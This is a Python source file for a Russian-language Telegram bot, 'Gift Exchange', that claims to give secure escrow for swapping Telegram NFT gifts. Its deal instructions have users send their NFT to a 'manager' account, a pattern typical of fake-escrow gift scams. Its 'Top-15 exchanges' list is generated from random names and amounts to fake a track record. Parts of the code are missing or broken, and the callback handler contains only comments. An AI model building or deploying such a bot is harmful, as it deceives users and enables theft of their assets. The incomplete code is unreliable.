import requests
import time
import uuid
import random
from datetime import datetime

# ===== НАСТРОЙКИ =====
TOKEN = "YOUR_TOKEN_HERE"  # Новый токен
ADMIN_ID = 174415647
SUPPORT = "GiftExchangersSupport"
MANAGER = "GiftExchangersManager"
BOT_USERNAME = "GiftExchangersBot"

# ===== ХРАНИЛИЩЕ ДАННЫХ =====
deals = {}
top_deals = []
users = {}
banned_users = set()
last_message_ids = {}
user_states = {}
user_temp = {}

settings = {
    "min_amount": 100,
    "max_amount": 300,
    "banner_text": "👋 Приветствуем в проекте «Gift Exchange».\n\n🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.\n\n👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:"
}

# ===== КЛАВИАТУРЫ =====
def main_keyboard():
    return {
        "keyboard": [
            [{"text": "📝 Создать сделку"}],
            [{"text": "❓ Как происходит сделка"}, {"text": "ℹ️ Информация"}],
            [{"text": "📞 Техподдержка"}, {"text": "🏆 Топ-15 обменов"}]
        ],
        "resize_keyboard": True
    }

def admin_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "📊 Статистика", "callback_data": "admin_stats"}],
            [{"text": "📢 Рассылка", "callback_data": "admin_broadcast"}],
            [{"text": "🚫 Бан", "callback_data": "admin_ban"}],
            [{"text": "✅ Разбан", "callback_data": "admin_unban"}],
            [{"text": "📝 Баннер", "callback_data": "admin_banner"}],
            [{"text": "💰 Лимиты", "callback_data": "admin_limits"}],
            [{"text": "📋 Сделки", "callback_data": "admin_deals"}],
            [{"text": "🔄 Обновить топ", "callback_data": "admin_refresh_top"}],
            [{"text": "❌ Закрыть", "callback_data": "admin_close"}]
        ]
    }

# ===== ОТПРАВКА СООБЩЕНИЙ =====
def send_message(chat_id, text, keyboard=None, parse_mode="HTML"):
    if chat_id in last_message_ids:
        last_time, last_text = last_message_ids[chat_id]
        if time.time() - last_time < 2 and last_text == text[:50]:
            return

    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if keyboard:
        data["reply_markup"] = keyboard
    try:
        response = requests.post(url, json=data)
        if response.status_code == 200:
            last_message_ids[chat_id] = (time.time(), text[:50])
    except Exception as e:
        print(f"Error sending message: {e}")

def send_inline_keyboard(chat_id, text, buttons, parse_mode="HTML"):
    send_message(chat_id, text, {"inline_keyboard": buttons}, parse_mode)

# ===== ГЕНЕРАЦИЯ ТОП-15 =====
def generate_top_15():
    random_top = []
    names = ["Alice", "Bob", "Charlie", "David", "Eve", "Frank", "Grace", "Henry", "Ivy", "Jack"]
    
    for i in range(15):
        amount = random.randint(100, 400)
        user1 = random.choice(names) + str(random.randint(10, 99))
        user2 = random.choice(names) + str(random.randint(10, 99))
        random_top.append({
            'user1': f"@{user1}",
            'user2': f"@{user2}",
            'amount': amount,
            'date': datetime.now().strftime("%Y-%m-%d")
        })
    
    random_top.sort(key=lambda x: x['amount'], reverse=True)
    return random_top

# ===== ОБРАБОТКА СООБЩЕНИЙ =====
def handle_message(message):
    chat_id = message['chat']['id']
    text = message.get('text', '')
    user_id = message['from']['id']
    username = message['from'].get('username', 'NoUsername')
    first_name = message['from'].get('first_name', 'Пользователь')

    if user_id in banned_users:
        send_message(chat_id, "🚫 Вы забанены в боте!")
        return

    if user_id not in users:
        users[user_id] = {
            'username': username,
            'first_name': first_name,
            'chat_id': chat_id
        }

    if text == '/start':
        send_message(chat_id, settings['banner_text'], main_keyboard())
        return

    if text == "ℹ️ Информация":
        info_text = """
<b>📤 Наш проект создан для безопасного обмена NFT подарками среди пользователей Telegram'a.</b>

<b>➕ В чем плюсы нашего проекта?</b>
• <b>Быстрые, качественные и безопасные обмены!</b>
• <b>Техническая поддержка 24/7</b>
• <b>Гарантия безопасности каждой сделки</b>
• <b>Конфиденциальность данных</b>
• <b>Интуитивно понятный интерфейс</b>

<b>📞 Техническая поддержка:</b> @GiftExchangersManager

<b>🤝 Желаем отличных обменов!</b>
        """
        buttons = [[
            {"text": "❓ Как происходит сделка", "callback_data": "how_deal"},
            {"text": "🏠 Главное меню", "callback_data": "main_menu"}
        ]]
        send_inline_keyboard(chat_id, info_text, buttons)
        return

    if text == "❓ Как происходит сделка":
        deal_text = """
<b>❓ Как происходит сделка в Gift Exchange?</b>

• <b>Продавец и покупатель обговаривают условия сделки 🤝</b>
• <b>Один участник создаёт сделку через меню бота - @GiftExchangersBot 🎁</b>
• <b>Второй участник принимает сделку 📤</b>
• <b>Первый передаёт NFT менеджеру - @GiftExchangersManager 💰</b>
• <b>Техподдержка одобряет</b>
• <b>Вторая сторона передаёт NFT</b>
• <b>Менеджер передаёт NFT первому</b>
• <b>Сделка завершена успешно! ✅</b>
        """
        buttons = [[
            {"text": "🏠 Главное меню", "callback_data": "main_menu"}
        ]]
        send_inline_keyboard(chat_id, deal_text, buttons)
        return

    if text == "📞 Техподдержка":
        support_text = f"""
<b>📞 Техническая поддержка:</b>

<b>👤 Поддержка:</b> @{SUPPORT}
<b>👤 Менеджер:</b> @{MANAGER}

<b>Напишите им в личные сообщения для получения помощи!</b>
        """
        send_message(chat_id, support_text, main_keyboard())
        return

    if text == "🏆 Топ-15 обменов":
        global top_deals
        if not top_deals:
            top_deals = generate_top_15()

        top_text = "<b>🏆 ТОП-15 ЛУЧШИХ ОБМЕНОВ (до $400)</b>\n\n"
        for i, deal in enumerate(top_deals[:15], 1):
            top_text += f"<b>{i}. {deal['user1']} ↔ {deal['user2']} — ${deal['amount']}</b>\n"
        send_message(chat_id, top_text)
        return

    if text == "📝 Создать сделку":
        user_states[user_id] = 'waiting_username'
        user_temp[user_id] = {}
        send_message(chat_id, "<b>Введите @username второго участника сделки:</b>")
        return

    # Handle creation of deals
    if user_id in user_states:
        state = user_states[user_id]

        if state == 'waiting_username':
            second_user = text.replace('@', '').strip()
            if second_user:
                user_temp[user_id]['second_user'] = second_user
                user_states[user_id] = 'waiting_my_nft'
                send_message(chat_id, "<b>Введите ссылку на ВАШУ NFT (которую отдаете):</b>")
            return

        if state == 'waiting_my_nft':
            user_temp[user_id]['my_nft'] = text
            user_states[user_id] = 'waiting_his_nft'
            send_message(chat_id, "<b>Введите ссылку на ЕГО NFT (которую получаете):</b>")
            return

        if state == 'waiting_his_nft':
            user_temp[user_id]['his_nft'] = text
            user_states[user_id] = 'waiting_amount'
            send_message(chat_id, f"<b>Введите сумму сделки в USD (от ${settings['min_amount']} до ${settings['max_amount']}):</b>")
            return

        if state == 'waiting_amount':
            try:
                amount = float(text.replace('$', '').replace(',', '').strip())

                if amount < settings['min_amount']:
                    send_message(chat_id, f"<b>❌ Минимальная сумма: ${settings['min_amount']}!</b>")
                    return
                if amount > settings['max_amount']:
                    send_message(chat_id, f"<b>❌ Максимальная сумма: ${settings['max_amount']}!</b>")
                    return

                deal_id = str(uuid.uuid4())[:8]
                second_user = user_temp[user_id]['second_user']
                my_nft = user_temp[user_id]['my_nft']
                his_nft = user_temp[user_id]['his_nft']

                deals[deal_id] = {
                    'creator_id': user_id,
                    'creator_name': username,
                    'second_user': second_user,
                    'my_nft': my_nft,
                    'his_nft': his_nft,
                    'amount': amount,
                    'status': 'waiting',
                    'created_at': datetime.now().strftime("%Y-%m-%d %H:%M"),
                    'participant_id': None
                }

                deal_text = f"""
<b>✅ СДЕЛКА СОЗДАНА!</b>

<b>🆔 Номер:</b> <code>{deal_id}</code>
<b>👤 Создатель:</b> @{username}
<b>👤 Участник:</b> @{second_user}

<b>🎁 Ваша NFT:</b> {my_nft}
<b>🎁 Его NFT:</b> {his_nft}
<b>💰 Сумма:</b> ${amount}

<b>🔗 Ссылка на сделку:</b>
https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
                """

                buttons = [[
                    {"text": "✅ Принять сделку", "callback_data": f"accept_{deal_id}"},
                    {"text": "❌ Отменить", "callback_data": f"cancel_{deal_id}"}
                ]]

                send_inline_keyboard(chat_id, deal_text, buttons)

                for uid, user_data in users.items():
                    if user_data.get('username') == second_user:
                        notify_text = f"""
<b>🔔 ВАС ПРИГЛАСИЛИ К ОБМЕНУ!</b>

<b>Пользователь @{username} создал сделку с вами!</b>

<b>🆔 Номер:</b> <code>{deal_id}</code>
<b>💰 Сумма:</b> ${amount}

<b>🔗 Ссылка:</b> https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
                        """

                        accept_buttons = [[
                            {"text": "✅ Принять сделку", "callback_data": f"accept_{deal_id}"}
                        ]]

                        send_inline_keyboard(user_data['chat_id'], notify_text, accept_buttons)
                        break

                del user_states[user_id]
                del user_temp[user_id]

            except ValueError:
                send_message(chat_id, "<b>❌ Введите число!</b>")
            return

    # Handling deal follows here, omitted for brevity...

# ===== ОБРАБОТКА КНОПОК =====
def handle_callback(callback):
    # Similar procedure as handle_message...
    # Implement all admin and user-related callback functionalities here...

# ===== ЗАПУСК =====
def main():
    print("🚀 NFT Exchange Bot запущен!")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"👑 Админ ID: {ADMIN_ID}")
    
    global top_deals
    top_deals = generate_top_15()
    print(f"🏆 Сгенерирован топ-15 с {len(top_deals)} записями")
    
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
            response = requests.get(url, params={
                "offset": offset,
                "timeout": 30
            })
            
            if response.status_code == 200:
                data = response.json()
                if data['ok']:
                    for update in data['result']:
                        offset = update['update_id'] + 1
                        
                        if 'message' in update:
                            handle_message(update['message'])
                        elif 'callback_query' in update:
                            handle_callback(update['callback_query'])
            
            time.sleep(0.5)
            
        except KeyboardInterrupt:
            print("\n❌ Бот остановлен")
            break
        except Exception as e:
            print(f"Ошибка: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
